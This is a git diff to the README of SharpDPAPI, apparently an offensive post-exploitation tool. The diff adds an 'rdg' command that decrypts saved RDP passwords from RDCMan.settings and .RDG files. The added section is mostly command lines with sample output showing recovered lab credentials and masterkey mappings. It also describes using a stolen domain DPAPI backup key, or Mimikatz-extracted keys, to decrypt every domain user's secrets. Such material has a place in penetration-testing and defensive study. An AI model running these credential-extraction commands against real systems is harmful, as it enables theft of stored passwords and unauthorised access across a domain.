@@ -31,6 +31,7 @@ SharpDPAPI is licensed under the BSD 3-Clause license.
     + [machinecredentials](#machinecredentials)
     + [vaults](#vaults)
     + [machinevaults](#machinevaults)
+    + [rdg](#rdg)
     + [triage](#triage)
     + [machinetriage](#machinetriage)
   * [Compile Instructions](#compile-instructions)
@@ -41,13 +42,11 @@ SharpDPAPI is licensed under the BSD 3-Clause license.
 
 ### Command Line Usage
 
-    C:\Temp>SharpDPAPI.exe
-
-     __                 _   _       _ ___
-    (_  |_   _. ._ ._  | \ |_) /\  |_) |
-    __) | | (_| |  |_) |_/ |  /--\ |  _|_
-                   |
-      v1.2.0
+      __                 _   _       _ ___
+     (_  |_   _. ._ ._  | \ |_) /\  |_) |
+     __) | | (_| |  |_) |_/ |  /--\ |  _|_
+                    |
+      v1.3.0
 
 
     Triage all reachable machine masterkey files (elevates to SYSTEM to retrieve the DPAPI_SYSTEM LSA secret):
@@ -65,12 +64,12 @@ SharpDPAPI is licensed under the BSD 3-Clause license.
       SharpDPAPI masterkeys </pvk:BASE64... | /pvk:key.pvk>
 
 
-    Triage all reachable user Credential files, Vaults, or both using a domain DPAPI backup key to decrypt masterkeys:
+    Triage all reachable user Credential files, Vaults, or both using a domain DPAPI backup key to decrypt masterkeys first:
 
       SharpDPAPI <credentials|vaults|triage> </pvk:BASE64... | /pvk:key.pvk>
 
 
-    Triage all reachable user Credential files, Vaults, or both on a *remote* system using a domain DPAPI backup key to decrypt masterkeys:
+    Triage all reachable user Credential files, Vaults, or both on a *remote* system using a domain DPAPI backup key to decrypt masterkeys first:
 
       SharpDPAPI <credentials|vaults|triage> </pvk:BASE64... | /pvk:key.pvk> /server:SERVER.domain.com
 
@@ -83,7 +82,7 @@ SharpDPAPI is licensed under the BSD 3-Clause license.
     Triage a specific Credential file or folder, using GUID lookups or a domain backup key for decryption:
 
       SharpDPAPI credentials /target:C:\FOLDER\ [GUID1:SHA1 GUID2:SHA1 ... | /pvk:BASE64... | /pvk:key.pvk]
-      SharpDPAPI credentials /target:C:\FOLDER\FILE [GUID1:SHA1 GUID2:SHA1 ... | /pvk:BASE64... | /pvk:key.pvk]
+      SharpDPAPI credentials /target:C:\FOLDER\FILE [GUID1:SHA1 GUID2:SHA1]
 
 
     Triage a specific Vault folder, using GUID lookups or a domain backup key for decryption:
@@ -91,9 +90,30 @@ SharpDPAPI is licensed under the BSD 3-Clause license.
       SharpDPAPI vaults /target:C:\FOLDER\ [GUID1:SHA1 GUID2:SHA1 ... | /pvk:BASE64... | /pvk:key.pvk]
 
 
+    Search for RDCMan.settings (and linked .RDG files), using CryptUnprotectData() to decrypt saved RDG passwords:
+
+      SharpDPAPI rdg /unprotect
+
+
+    Search for RDCMan.settings (and linked .RDG files), using GUID lookups or a domain backup key for decryption:
+
+      SharpDPAPI rdg  [GUID1:SHA1 GUID2:SHA1 ... | /pvk:BASE64... | /pvk:key.pvk]
+
+
+    Triage a specific .RDG/RDCMan.setting file or folder, using GUID lookups or a domain backup key for decryption:
+
+      SharpDPAPI rdg /target:C:\FOLDER\ [GUID1:SHA1 GUID2:SHA1 ... | /pvk:BASE64... | /pvk:key.pvk]
+      SharpDPAPI rdg /target:C:\FOLDER\FILE.rdg  [GUID1:SHA1 GUID2:SHA1 ... | /pvk:BASE64... | /pvk:key.pvk]
+
+
     Retrieve a domain controller's DPAPI backup key, optionally specifying a DC and output file:
 
       SharpDPAPI backupkey [/server:SERVER.domain] [/file:key.pvk]
+
+
+    Describe a DPAPI binary blob, optionally using GUID lookups or a domain backup key for decryption:
+
+      SharpDPAPI blob /in:C:\FOLDER\blob.bin [GUID1:SHA1 GUID2:SHA1 ... | /pvk:BASE64... | /pvk:key.pvk]
 
 
 ### Operational Usage
@@ -102,9 +122,11 @@ One of the goals with SharpDPAPI is to operationalize Benjamin's DPAPI work in a
 
 How exactly you use the toolset will depend on what phase of an engagement you're in. In general this breaks into "have I compromised the domain or not".
 
-If domain admin (or equivalent) privileges have been obtained, the domain DPAPI backup key can be retrieved with the [backupkey](#backupkey) command (or with Mimikatz). This domain private key never changes, and can decrypt any DPAPI masterkeys for domain users. This means, given a domain DPAPI backup key, an attacker can decrypt masterkeys for any domain user that can then be used to decrypt any Vault/Credentials/Chrome Logins/other DPAPI blobs/etc. The key retrieved from the [backupkey](#backupkey) command can be used with the [masterkeys](#masterkeys), [credentials](#credentials), [vaults](#vaults), or [triage](#triage) commands.
+If domain admin (or equivalent) privileges have been obtained, the domain DPAPI backup key can be retrieved with the [backupkey](#backupkey) command (or with Mimikatz). This domain private key never changes, and can decrypt any DPAPI masterkeys for domain users. This means, given a domain DPAPI backup key, an attacker can decrypt masterkeys for any domain user that can then be used to decrypt any Vault/Credentials/Chrome Logins/other DPAPI blobs/etc. The key retrieved from the [backupkey](#backupkey) command can be used with the [masterkeys](#masterkeys), [credentials](#credentials), [vaults](#vaults), [rdg](#rdg), or [triage](#triage) commands.
 
-If DA privileges have not been achieved, using Mimikatz' `sekurlsa::dpapi` command will retrieve DPAPI masterkey {GUID}:SHA1 mappings of any loaded master keys (user and SYSTEM) on a given system (tip: running `dpapi::cache` after key extraction will give you a nice table). If you change these keys to a `{GUID1}:SHA1 {GUID2}:SHA1...` type format, they can be supplied to the [credentials](#credentials), [vaults](#vaults), or [triage](#triage) commands. This lets you triage all Credential files/Vaults on a system for any user who's currently logged in, without having to do file-by-file decrypts.
+If DA privileges have not been achieved, using Mimikatz' `sekurlsa::dpapi` command will retrieve DPAPI masterkey {GUID}:SHA1 mappings of any loaded master keys (user and SYSTEM) on a given system (tip: running `dpapi::cache` after key extraction will give you a nice table). If you change these keys to a `{GUID1}:SHA1 {GUID2}:SHA1...` type format, they can be supplied to the [credentials](#credentials), [vaults](#vaults), [rdg](#rdg), or [triage](#triage) commands. This lets you triage all Credential files/Vaults on a system for any user who's currently logged in, without having to do file-by-file decrypts.
+
+For decrypting RDG/RDCMan.settings files with the [rdg](#rdg) command, the `/unprotect` flag will use CryptUnprotectData() to decrypt any saved RDP passwords, *if* the command is run from the user context who saved the passwords. This can be done from an _unprivileged_ context, without the need to touch LSASS. For why this approach isn't used for credentials/vaults, see Benjamin's [documentation here](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials#problem).
 
 For machine-specific DPAPI triage, the `machinemasterkeys|machinecredentials|machinevaults|machinetriage` commands will do the machine equivalent of user DPAPI triage. If in an elevated context (that is, you need local administrative rights), SharpDPAPI will elevate to SYSTEM privileges to retrieve the "DPAPI_SYSTEM" LSA secret, which is then used to decrypt any discovered machine DPAPI masterkeys. These keys are then used as lookup tables for machine credentials/vaults/etc.
 
@@ -554,9 +576,162 @@ Local administrative rights are needed (so we can retrieve the DPAPI_SYSTEM LSA 
     ...(snip)...
 
 
+### rdg
+
+The **rdg** command will search for RDCMan.settings files for the current user (or if elevated, all users) and either a) decrypt found RDP passwords with any "{GUID}:SHA1" masterkeys passed, or b) use a supplied DPAPI domain backup key (`/pvk:BASE64...` or `/pvk:key.pvk`) to first decrypt any user masterkeys (a la **masterkeys**), which are then used as a lookup deryption table. DPAPI GUID mappings can be recovered with Mimikatz' `sekurlsa::dpapi` command.
+
+The `/unprotect` flag will use CryptUnprotectData() to decrypt any saved RDP passwords, *if* the command is run from the user context who saved the passwords. This can be done from an _unprivileged_ context, without the need to touch LSASS. For why this approach isn't used for credentials/vaults, see Benjamin's [documentation here](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials#problem).
+
+A specific RDCMan.settings file, .RDC file (or folder of .RDG files) can be specified with `/target:FILE` or `/target:C:\Folder\`. If a file is specified, {GUID}:SHA1 values (or `/unprotect`) are required, and if a folder is specified either a) {GUID}:SHA1 values must be supplied or b) the folder must contain DPAPI masterkeys and a /pvk domain backup key must be supplied.
+
+This command will decrypt any saved password information from both the RDCMan.settings file and any .RDG files referenced by the RDCMan.settings file.
+
+Using `/unprotect` to decrypt any found passwords:
+
+    C:\Temp>SharpDPAPI.exe rdg /unprotect
+
+      __                 _   _       _ ___
+     (_  |_   _. ._ ._  | \ |_) /\  |_) |
+     __) | | (_| |  |_) |_/ |  /--\ |  _|_
+                    |
+      v1.3.0
+
+
+    [*] Action: RDG Triage
+
+    [*] Using CryptUnprotectData() to decrypt RDG passwords
+
+    [*] Triaging RDCMan Settings Files for current user
+
+        RDCManFile    : C:\Users\harmj0y\AppData\Local\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
+        Accessed      : 5/9/2019 11:52:58 AM
+        Modified      : 5/9/2019 11:52:58 AM
+        Recent Server : test\primary.testlab.local
+
+            Cred Profiles
+
+              Profile Name : testprofile
+                UserName   : testlab.local\dfm
+                Password   : Password123!
+
+            Default Logon Credentials
+
+              Profile Name : Custom
+                UserName   : TESTLAB\harmj0y
+                Password   : Password123!
+
+          C:\Users\harmj0y\Documents\test.rdg
+
+            Servers
+
+              Name         : secondary.testlab.local
+
+              Name         : primary.testlab.local
+              Profile Name : Custom
+                UserName   : TESTLAB\dfm.a
+                Password   : Password123!
+
+
+Using domain {GUID}:SHA1 masterkey mappings:
+
+    C:\Temp>SharpDPAPI.exe rdg {8abc35b1-b718-4a86-9781-7fd7f37101dd}:ae349cdd3a230f5e04f70fd02be69e2e71f1b017
+
+      __                 _   _       _ ___
+     (_  |_   _. ._ ._  | \ |_) /\  |_) |
+     __) | | (_| |  |_) |_/ |  /--\ |  _|_
+                    |
+      v1.3.0
+
+
+    [*] Action: RDG Triage
+
+    [*] Using CryptUnprotectData() to decrypt RDG passwords
+
+    [*] Triaging RDCMan Settings Files for current user
+
+        RDCManFile    : C:\Users\harmj0y\AppData\Local\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
+        Accessed      : 5/9/2019 11:52:58 AM
+        Modified      : 5/9/2019 11:52:58 AM
+        Recent Server : test\primary.testlab.local
+
+            Cred Profiles
+
+              Profile Name : testprofile
+                UserName   : testlab.local\dfm
+                Password   : Password123!
+
+            Default Logon Credentials
+
+              Profile Name : Custom
+                UserName   : TESTLAB\harmj0y
+                Password   : Password123!
+
+          C:\Users\harmj0y\Documents\test.rdg
+
+            Servers
+
+              Name         : secondary.testlab.local
+
+              Name         : primary.testlab.local
+              Profile Name : Custom
+                UserName   : TESTLAB\dfm.a
+                Password   : Password123!
+
+
+Using a domain DPAPI backup key to first decrypt any discoverable masterkeys:
+
+    C:\Temp>SharpDPAPI.exe rdg /pvk:HvG1sAAAAAABAAAAAAAAAAAAAAC...(snip)...
+
+      __                 _   _       _ ___
+     (_  |_   _. ._ ._  | \ |_) /\  |_) |
+     __) | | (_| |  |_) |_/ |  /--\ |  _|_
+                    |
+      v1.3.0
+
+
+    [*] Action: RDG Triage
+
+    [*] Using a domain DPAPI backup key to triage masterkeys for decryption key mappings!
+
+    [*] User master key cache:
+
+    {42e95117-ff5f-40fa-a6fc-87584758a479}:4C802894C566B235B7F34B011316E94CC4CE4665
+    ...(snip)...
+
+    [*] Triaging RDCMan.settings Files for ALL users
+
+        RDCManFile    : C:\Users\harmj0y\AppData\Local\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
+        Accessed      : 5/9/2019 11:52:58 AM
+        Modified      : 5/9/2019 11:52:58 AM
+        Recent Server : test\primary.testlab.local
+
+            Cred Profiles
+
+              Profile Name : testprofile
+                UserName   : testlab.local\dfm.a
+                Password   : Password123!
+
+            Default Logon Credentials
+
+              Profile Name : Custom
+                UserName   : TESTLAB\harmj0y
+                Password   : Password123!
+
+          C:\Users\harmj0y\Documents\test.rdg
+
+            Servers
+
+              Name         : secondary.testlab.local
+
+              Name         : primary.testlab.local
+              Profile Name : Custom
+                UserName   : TESTLAB\dfm.a
+                Password   : Password123!
+
+
 ### triage
 
-The **triage** command runs the user [credentials](#credentials) and [vaults](#vaults) triage commands.
+The **triage** command runs the user [credentials](#credentials), [vaults](#vaults), and [rdg](#rdg) triage commands.
 
 
 ### machinetriage
